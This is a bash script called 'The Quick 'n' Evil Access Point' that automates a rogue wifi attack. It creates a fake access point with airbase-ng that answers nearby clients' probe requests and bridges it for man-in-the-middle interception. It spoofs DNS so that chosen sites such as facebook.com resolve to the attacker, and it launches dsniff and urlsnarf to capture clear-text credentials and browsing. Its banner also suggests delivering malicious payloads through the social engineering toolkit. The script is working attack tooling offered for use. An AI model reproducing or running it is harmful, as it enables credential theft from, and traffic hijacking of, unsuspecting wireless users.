#!/bin/bash
txtgreen=$(tput setaf 2) # Green
txtrst=$(tput sgr0) # Text reset
clear
echo
echo " ***************************************************"
echo " * *"
echo " * Welcome to *"
echo " * ${txtgreen} The Quick 'n' Evil Access Point${txtrst} *"
echo " * By Sean gambles Nov 2011 v0.11 *"
echo " * *"
echo " ***************************************************"
echo
echo "This tool makes use of the aircrack suite. "
echo "This script will setup a fake access point of your choosing, spoof any"
echo "Access Points that nearby computers are probing for, and then setup DNS "
echo "spoofing and Dsniff to redirect connected clients to your IP address, and"
echo "sniff for clear-text credentials. "
echo "Once the Access Point is up and running, you can utilise other tools"
echo "such as the social engineering toolkit to run alongside this, and either"
echo "capture credentials, or deliver malicous payloads through iframe and java"
echo "applet methods. Ideally, for this script to work, you will need to have "
echo "an alfa wifi card plugged in and a mapped network connection through VMWare,"
echo "preferbly bridged,not NAT'd, as these seem to crash out regularly."
echo
sleep 3
echo
echo "${txtgreen}[*]Please enter the number given to your eth device e.g eth2."
read -p "this can be found by running ifconfig -a :${txtrst}" wired
echo
echo
read -p "${txtgreen}[*]Please enter the number given to your wireless device e.g wlan1 :${txtrst}" wifi
echo
echo
read -p "${txtgreen}[*]Please enter the channel you would like your access point to run on :${txtrst}" channel
echo
echo
read -p "${txtgreen}[*]Please enter the SSID you would like your access point to use :${txtrst}" ssid
echo
echo
echo "${txtgreen}[*]Repairing the issue with the Alfa driver...${txtrst}"
echo
echo "Please be patient, you may ignore any errors here"
rmmod rtl8187
rfkill block all
rfkill unblock all
modprobe rtl8187
rfkill unblock all
echo Bringing $wifi Up
ifconfig $wifi up
ifconfig $wifi down
ifconfig $wifi up
clear
echo
echo
echo "${txtgreen}[*]Setting up the fake access point ${txtrst}"
sleep 2
clear
echo
echo
echo "${txtgreen}[*]cleaning up previous network settings${txtrst}"
ifconfig mitm down
brctl delbr mitm
ifconfig $wired 0.0.0.0 down
ifconfig at0 down
airmon-ng stop mon0
clear
echo
echo
echo "${txtgreen}[*]putting wifi into monitor mode${txtrst}"
airmon-ng start $wifi
sleep 2
clear
echo
echo
echo "${txtgreen}[*]setting the channel on the interfaces${txtrst}"
iwconfig $wifi channel $channel
iwconfig mon0 channel $channel
clear
echo
echo
echo "${txtgreen}[*]Setting up the fake access point on channel $channel ${txtrst}"
xterm -geometry 120x7-0+0 -bg black -fg green -T "airbase-ng" -e /usr/local/sbin/airbase-ng --essid $ssid -P -C 10 -c $channel mon0 &
sleep 2
clear
echo
echo
echo "${txtgreen}[*]Fake Access Point is now running.... ${txtrst}"
sleep 2
clear
echo
echo
echo "${txtgreen}[*]bringing up the at0 interface${txtrst}"
ifconfig at0 up
sleep 5
clear
echo
echo
echo "${txtgreen}[*]Adding the man in the middle bridge${txtrst}"
brctl addbr mitm
sleep 2
clear
echo
echo
echo "${txtgreen}[*]Joining the at0 and eth interfaces to your bridge${txtrst}"
brctl addif mitm $wired
brctl addif mitm at0
sleep 2
clear
echo
echo
echo "${txtgreen}[*]Clearing the ip addresses"
ifconfig $wired 0.0.0.0 up
sleep 2
ifconfig at0 0.0.0.0 up
sleep 2
clear
echo
echo
echo "${txtgreen}[*]Bringing up the new bridge and collecting an ip address${txtrst}"
ifconfig mitm up
dhclient mitm
sleep 5
mitm=$(ifconfig mitm | sed -n '2 p' | awk '{print $2}' |cut -d":" -f2)
clear
echo
echo
echo "${txtgreen}[*]Please enter up to three websites you wish to spoof"
read -p "DNS for e.g *.facebook.com www.google.com *.com :${txtrst}" web1 web2 web3
sleep 2
clear
echo
echo
echo "${txtgreen}[*]Starting up Dnsspoof Dsniff and URLsnarf...."
echo $mitm $web1>/tmp/hosts.txt
echo $mitm $web2>>/tmp/hosts.txt
echo $mitm $web3>>/tmp/hosts.txt
sleep 2
clear
echo
echo
echo "${txtgreen}[*]Okay.... all ready to go, have fun! :0) ${txtrst}"
xterm -geometry 120x7-0+200 -bg black -fg green -T "DNSspoof" -e /usr/local/sbin/dnsspoof -f /tmp/hosts.txt -i mitm &
xterm -geometry 120x7-0+350 -bg black -fg green -T "Dsniff" -e /usr/local/sbin/dsniff -i mitm &
xterm -geometry 120x7-0+500 -bg black -fg green -T "URLsnarf" -e /usr/local/sbin/urlsnarf -i mitm &
sleep 12
